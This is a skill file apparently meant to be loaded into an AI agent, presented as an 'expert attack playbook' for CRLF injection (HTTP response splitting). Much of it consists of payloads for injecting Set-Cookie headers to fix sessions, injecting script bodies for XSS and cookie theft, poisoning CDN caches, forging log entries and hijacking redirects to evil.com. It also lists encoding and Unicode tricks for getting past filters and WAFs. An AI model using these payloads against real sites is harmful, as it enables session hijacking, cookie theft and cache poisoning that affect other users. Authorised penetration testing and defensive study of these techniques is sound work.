---
name: crlf-injection
description: >-
  CRLF injection playbook. Use when user input reaches HTTP response headers, Location redirects, Set-Cookie values, or log files where carriage-return/line-feed characters can split or inject content.
---

# SKILL: CRLF Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: CRLF injection (HTTP response splitting) techniques. Covers header injection, response body injection via double CRLF, XSS escalation, cache poisoning, and encoding bypass. Often overlooked by scanners but chains into XSS, session fixation, and cache attacks.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the target is a **Java service** and `%0D%0A` / `\r\n` encodings are WAF-blocked — substituting `瘍` (U+760D, low byte `\r`) and `瘊` (U+760A, low byte `\n`) injects a real CRLF through Angus Mail / Jakarta Mail SMTP, Apache HttpClient headers, JDK HttpServer responses, and ActiveJ HTTP (re-enables Jira CVE-2025-57733 and JDK CVE-2026-21933 classes)

## 1. CORE CONCEPT

CRLF = `\r\n` (Carriage Return + Line Feed, `%0D%0A`). HTTP headers are separated by CRLF. If user input is reflected in a response header without sanitization, injecting CRLF characters creates new headers or even a response body.

```
Normal: Location: /page?url=USER_INPUT
Attack: Location: /page?url=%0D%0ASet-Cookie:admin=true
Result: Two headers — Location + injected Set-Cookie
```

---

## 2. DETECTION

### Basic Probe

```text
%0D%0ANew-Header:injected

# In URL parameter:
https://target.com/redirect?url=%0D%0AX-Injected:true

# Check response headers for "X-Injected: true"
```

### Double CRLF — Body Injection

Two consecutive CRLF sequences end headers and start body:

```text
%0D%0A%0D%0A<script>alert(1)</script>

# Result:
HTTP/1.1 302 Found
Location: /page

<script>alert(1)</script>
```

---

## 3. EXPLOITATION SCENARIOS

### Session Fixation via Set-Cookie

```text
%0D%0ASet-Cookie:PHPSESSID=attacker_controlled_session_id
```

### XSS via Response Body

```text
%0D%0A%0D%0A<html><script>alert(document.cookie)</script></html>
```

### Cache Poisoning

If the response is cached by a CDN or proxy, injected headers/body are served to all users:

```text
GET /page?q=%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:text/html%0D%0A%0D%0A<script>alert(1)</script>
```

### Log Injection

CRLF in log-visible fields (User-Agent, Referer) can forge log entries:

```text
User-Agent: normal%0D%0A127.0.0.1 - admin [date] "GET /admin" 200
```

---

## 4. FILTER BYPASS

| Filter | Bypass |
|---|---|
| Blocks `%0D%0A` | Try `%0D` alone, `%0A` alone, or `%E5%98%8A%E5%98%8D` (Unicode) |
| URL decodes once | Double-encode: `%250D%250A` |
| Strips `\r\n` literally | Use URL-encoded form |
| Blocks in value only | Inject in parameter name |

```text
# Unicode/UTF-8 bypass:
%E5%98%8A%E5%98%8D  → decoded as CRLF in some parsers

# Double URL encoding:
%250D%250A → server decodes to %0D%0A → interpreted as CRLF

# Partial injection (LF only):
%0A → some servers accept LF without CR
```

---

## 5. REAL-WORLD EXPLOITATION CHAINS

### CRLF + Session Fixation

```text
# Inject Set-Cookie via CRLF in redirect parameter:
?url=%0D%0ASet-Cookie:PHPSESSID=attacker_controlled_session_id

# Result:
HTTP/1.1 302 Found
Location: /page
Set-Cookie: PHPSESSID=attacker_controlled_session_id

# Victim uses attacker's session → attacker hijacks after login
```

### CRLF → XSS via Double CRLF Body Injection

```text
# Two CRLF sequences end headers and inject response body:
?url=%0D%0A%0D%0A<script>alert(document.cookie)</script>

# Result:
HTTP/1.1 302 Found
Location: /page

<script>alert(document.cookie)</script>
```

### CRLF in 302 Location → Redirect Hijack

```text
# Inject new Location header before the original:
?url=%0D%0ALocation:http://evil.com%0D%0A%0D%0A

# Some servers use the LAST Location header → redirect to evil.com
```

---

## 6. COMMON VULNERABLE PATTERNS

```php
// PHP — header() with user input (PHP < 5.1.2 vulnerable):
header("Location: " . $_GET['url']);

// Python — redirect with unsanitized input:
return redirect(request.args.get('next'))

// Node.js — setHeader with user input:
res.setHeader('X-Custom', userInput);

// Java — response.setHeader with user input:
response.setHeader("Location", request.getParameter("url"));
```

---

## 7. TESTING CHECKLIST

```
□ Inject %0D%0A in redirect URL parameters
□ Inject %0D%0A in Set-Cookie name/value paths
□ Try double CRLF for body injection → XSS
□ Test encoding bypasses: double-encode, Unicode (%E5%98%8D%E5%98%8A), LF-only (%0A)
□ Check if response is cacheable → cache poisoning
□ Test in User-Agent / Referer for log injection
□ Test CRLF + Set-Cookie for session fixation
□ Verify if Location header can be injected in 302 responses
```
